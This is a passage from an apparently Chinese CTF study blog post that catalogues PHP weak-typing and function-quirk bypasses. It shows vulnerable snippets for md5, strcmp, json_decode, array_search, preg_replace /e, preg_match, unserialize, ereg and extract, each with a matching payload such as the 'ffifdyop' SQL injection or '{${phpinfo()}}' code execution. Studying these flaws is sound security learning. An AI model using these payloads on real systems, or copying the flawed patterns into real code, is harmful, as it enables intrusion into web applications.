&gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick;</span><br><span class="line">$a-&gt;trick1=<span class="number">0.01</span>;</span><br><span class="line">$a-&gt;trick2=<span class="number">0.1</span>*<span class="number">0.1</span>;</span><br><span class="line">var_dump(serialize($a));</span><br></pre></td></tr></table></figure><p>这里采用序列化的方式是因为需要传入的是数字，而常规 post 或 get 输入默认会被当做字符串处理</p><ol start="6"><li>第二个参数被设置为 true</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第二个参数设置为 true 时， MD5 报文摘要将以16字节长度的原始二进制格式返回</p><p><code>?password=ffifdyop</code> ，sql 语句转换为 <code>SELECT * FROM admin WHERE pass=&#39; &#39;or &#39; 6&#39;&lt;trash&gt;</code></p><p>同样 <code>129581926211651571912466741651878684928</code> md5 后为 <code>T0Do#&#39;or&#39;8</code></p><h3 id="1-4-json-decode"><a href="#1-4-json-decode" class="headerlink" title="1.4 json_decode()"></a>1.4 json_decode()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运用 bool 欺骗，json_decode 将 key 值解析为 bool 类型的 false，payload <code>message={&quot;key&quot;:0}</code></p><h3 id="1-5-array-search"><a href="#1-5-array-search" class="headerlink" title="1.5 array_search()"></a>1.5 array_search()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!is_array($_GET[<span class="string">'test'</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line">$test=$_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($test);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($test[$i]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i]=intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">"admin"</span>,$test)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/array_search" target="_blank" rel="noopener">https://www.php.net/array_search</a></p><p>参照 PHP 手册，<code>array_search ( mixed $needle , array $haystack [, bool $strict = false ] ) : mixed</code>，第三个参数 <code>strict</code> 默认为 <code>false</code>，如果可选的第三个参数 <code>strict</code> 为 <code>TRUE</code>，则 array_search() 将在 <code>haystack</code> 中检查<em>完全相同</em>的元素。 这意味着同样严格比较 <code>haystack</code>里 <code>needle</code> 的 类型，并且对象需是同一个实例。</p><p>即默认为 <code>false</code> 时，会进行弱类型比较，于是 payload <code>test[]=0</code></p><h3 id="1-6-strcmp"><a href="#1-6-strcmp" class="headerlink" title="1.6 strcmp()"></a>1.6 strcmp()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">    $password=<span class="string">"***************"</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Right!!!login success"</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wrong password.."</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>strcmp()函数在PHP官方手册中的描述是<code>int strcmp ( string $str1 , string $str2 )</code>,需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。</p><p>如果传入给出strcmp()的参数是数组则返回NULL，<code>NULL==0</code>是 <code>bool(true)</code>，所以 payload <code>password[]=2</code></p><h3 id="1-7-sha1"><a href="#1-7-sha1" class="headerlink" title="1.7 sha1()"></a>1.7 sha1()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">$tmp1 = $_POST[<span class="string">'tmp1'</span>];</span><br><span class="line">$tmp2 = $_POST[<span class="string">'tmp2'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($tmp1) &amp;&amp; !<span class="keyword">isset</span>($tmp2) &amp;&amp; $tmp1 == $tmp2 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($tmp1)==md5($tmp2) &amp;&amp; sha1($tmp1)==sha1($tmp2)&amp;&amp;base64_decode($tmp1) == base64_decode($tmp2))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入数组放回 <code>NULL</code>，payload <code>tmp1[]=1&amp;tmp2[]=2</code></p><h3 id="1-8-base64-encode-、base64-decode"><a href="#1-8-base64-encode-、base64-decode" class="headerlink" title="1.8 base64_encode()、base64_decode()"></a>1.8 base64_encode()、base64_decode()</h3><p>同 <code>sha1()</code> 和 <code>strcmp()</code></p><h3 id="1-9-intval"><a href="#1-9-intval" class="headerlink" title="1.9 intval()"></a>1.9 intval()</h3><p>intval(var)函数用于获取变量的整数值。在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符，即使出现无法转换的字符串也不会报错而是返回0，从而可以导致如下情形的Bypass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($a) === <span class="number">666</span>) &#123;</span><br><span class="line">$sql = <span class="string">"Select a From Table Where Id="</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"No..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/26/PHP_01/20200814205019.png" alt="image-20200814205011129"></p><h2 id="2-srand-mt-srand"><a href="#2-srand-mt-srand" class="headerlink" title="2 srand()/mt_srand()"></a>2 srand()/mt_srand()</h2><p>语法：<code>srand(seed)</code> 和 <code>mt_srand(seed)</code></p><p>自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。但他却有个特性就是 当设置好种子后 再通过mt_rand()生成出来的随机数将会是固定的。</p><p><a href="https://mp.weixin.qq.com/s/nVqkiMXyg2D_HtwLTkSgMA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nVqkiMXyg2D_HtwLTkSgMA</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomString</span><span class="params">($len, $chars=null)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (is_null($chars))&#123; $chars = <span class="string">"bcdefghijklmnpqrtuvwxyzBCDEFGHIJKLMNPQRTUVWXYZ12345679"</span>; &#125;</span><br><span class="line">mt_srand(<span class="number">10000000</span>*(double)microtime());</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>, $str = <span class="string">''</span>, $lc = strlen($chars)<span class="number">-1</span>; $i &lt; $len; $i++)&#123;</span><br><span class="line">$str .= $chars[mt_rand(<span class="number">0</span>, $lc)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(double)microtime() 只有6位有效数字，种子取值0,10,20,30,40,50,60,70,80,90,100~9999980,9999990 共100W，种子固定，生成的随机数固定即生成的随机字符串固定，导致可爆破</p><h2 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3 preg_replace()"></a>3 preg_replace()</h2><p><strong>定义：</strong><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code></p><p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换</p><p><strong>参数：</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$pattern</span>: 要搜索的模式，可以是字符串或一个字符串数组。</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$replacement</span>: 用于替换的字符串或字符串数组。</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$subject</span>: 要搜索替换的目标字符串或字符串数组。</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$limit</span>: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$count</span>: 可选，为替换执行的次数。</span></span><br></pre></td></tr></table></figure><p><strong>常用PCRE修饰符：</strong></p><ul><li><em>i</em> (<em>PCRE_CASELESS</em>)：如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配</li><li><em>m</em> (<em>PCRE_MULTILINE</em>)： “行首”元字符 (^) 和”行末”元字符 ($) 会匹配目标字符串中任意换行符之前或之后</li><li><em>s</em> (<em>PCRE_DOTALL</em>)：点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。一个取反字符类比如 <code>[^a]</code> 总是匹配换行符，而不依赖于这个修饰符的设置。</li></ul><p><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php</a></p><p>1）/e 修饰符问题</p><p>在PHP5.5.0起废弃，php7.0.0 起不再支持</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">'/test/e'</span>,$_GET[<span class="string">'r'</span>],<span class="string">'atest'</span>);</span><br></pre></td></tr></table></figure><p><code>?r=phpinfo()</code>，获取 phpinfo</p><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span><span class="params">($regex, $value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_replace(</span><br><span class="line">    <span class="string">'/('</span> . $regex . <span class="string">')/ei'</span>,</span><br><span class="line">    <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">    $value</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $regex =&gt; $value) &#123;</span><br><span class="line">  <span class="keyword">echo</span> complexStrtolower($regex, $value) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?\S*={${phpinfo()}}</code> ，正则表达式 <code>\1</code> 表示符合匹配的第一个子串，<code>{${phpinfo()}}</code> 使用了可变变量的知识。</p><p>2）经典写配置漏洞</p><p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa\\'</span>);</span><br></pre></td></tr></table></figure><h2 id="4-preg-match"><a href="#4-preg-match" class="headerlink" title="4 preg_match()"></a>4 preg_match()</h2><p>1）缺少开始和结束符</p><p>在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">'1.1.1.1 abcd'</span>; <span class="comment">// 可以绕过</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>,$ip)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span>(<span class="string">'key...'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2）PCRE 回溯次数限制绕过</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_php($input)) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可填入垃圾数据导致回溯次数超过了100万 <code>preg_match</code> 返回 FALSE 绕过判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bool(false)</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, <span class="string">'&lt;?php phpinfo();//'</span>.str_repeat(<span class="string">'c'</span>, <span class="number">1000000</span>)));</span><br></pre></td></tr></table></figure><p>修复方法，改用 <code>===</code> 判断返回值，不要只使用 if 判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_php($input) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-序列化"><a href="#5-序列化" class="headerlink" title="5 序列化"></a>5 序列化</h2><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><h3 id="5-1-wakeup-绕过"><a href="#5-1-wakeup-绕过" class="headerlink" title="5.1 __wakeup() 绕过"></a>5.1 __wakeup() 绕过</h3><p><a href="https://www.mi1k7ea.com/2019/06/21/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%B0%8F%E7%BB%93/#0x04" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/21/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%B0%8F%E7%BB%93/#0x04</a></p><blockquote><p>wakeup()作为反序列化中的一个魔法函数，自<code>unserialize()</code>从字节流中创建了一个对象后，程序会马上检测是否具有wakeup()函数存在。若存在，__wakeup()函数会立即被调用。</p><p>使用__wakeup()函数的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</p><p>在如下情形中，在序列化字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2会产生报错，导致不会去执行__wakeup()函数，从而Bypass</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mi1k7ea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $text = <span class="string">"h12r0h1f0jfj"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"[!]Bad Request."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo serialize(new Mi1k7ea());</span></span><br><span class="line"><span class="comment">// O:7:"Mi1k7ea":1:&#123;s:4:"text";s:12:"h12r0h1f0jfj";&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> unserialize($_GET[<span class="string">'flag'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bypass __wakeup()!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-2-特殊的序列化类型S-大写"><a href="#5-2-特殊的序列化类型S-大写" class="headerlink" title="5.2 特殊的序列化类型S(大写)"></a>5.2 特殊的序列化类型S(大写)</h3><p>PHP6 新增序列化格式 S，escaped binary string，会将 \xx(16进制) 当做字符处理，所以这里可以造成 check 的绕过，可以参照 2020 强网杯web辅助一题</p><p><a href="https://z3ratu1.github.io/2020/08/24/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5Dweb/" target="_blank" rel="noopener">https://z3ratu1.github.io/2020/08/24/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5Dweb/</a></p><h2 id="6-ereg"><a href="#6-ereg" class="headerlink" title="6 ereg()"></a>6 ereg()</h2><p>功能同 preg_match() 类似，只不过仅在 php4，php5 中可使用，可使用 <code>%00</code> 截断正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?password=123%00&amp;&amp;** </span></span><br><span class="line"><span class="comment">//int 1</span></span><br><span class="line">var_dump(ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]));</span><br></pre></td></tr></table></figure><h2 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="7 is_numeric()"></a>7 is_numeric()</h2><p>is_numeric()函数来判断变量是否为数字，是数字返回1，不是则返回0。比较范围不局限于十进制数字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"flag&#123;test&#125;"</span>;</span><br><span class="line"></span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;    </span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?password=1337a</code></p><h2 id="8-变量覆盖"><a href="#8-变量覆盖" class="headerlink" title="8 变量覆盖"></a>8 变量覆盖</h2><p><code>https://www.mi1k7ea.com/2019/06/20/PHP变量覆盖漏洞/</code></p><p>变量覆盖即通过外部输入将某个变量的值给覆盖掉，通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。</p><h3 id="8-1-register-globals"><a href="#8-1-register-globals" class="headerlink" title="8.1 register_globals"></a>8.1 register_globals</h3><p>php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。</p><p><strong>注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</strong></p><p>当register_globals=On，变量未被初始化且能够用户所控制时，就会存在变量覆盖漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Register_globals: "</span> . (int)ini_get(<span class="string">"register_globals"</span>) . <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?a=1</code>，可以通过 get 、post 也可以通过 cookie 等方式传递</p><h3 id="8-2-extract"><a href="#8-2-extract" class="headerlink" title="8.2 extract()"></a>8.2 extract()</h3><p>extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。必须使用关联数组，数字索引的数组将不会产生结果，除非用了 <strong><code>EXTR_PREFIX_ALL</code></strong> 或者 <strong><code>EXTR_PREFIX_INVALID</code></strong>。</p><p><strong>函数定义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract ( <span class="keyword">array</span> &amp;$array [, int $flags = 